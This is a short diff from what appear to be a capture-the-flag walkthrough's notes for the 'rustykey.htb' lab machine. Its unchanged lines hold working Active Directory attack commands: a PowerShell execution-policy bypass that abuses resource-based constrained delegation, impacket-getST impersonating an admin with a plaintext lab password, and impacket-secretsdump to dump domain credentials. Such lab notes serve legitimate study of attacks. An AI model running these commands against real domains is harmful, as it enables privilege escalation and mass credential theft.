@@ -164,7 +164,7 @@ shell
 powershell -exec bypass
    Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
 
-----
+---- backupadmin
 ff impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
 export KRB5CCNAME=./backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
 ff impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
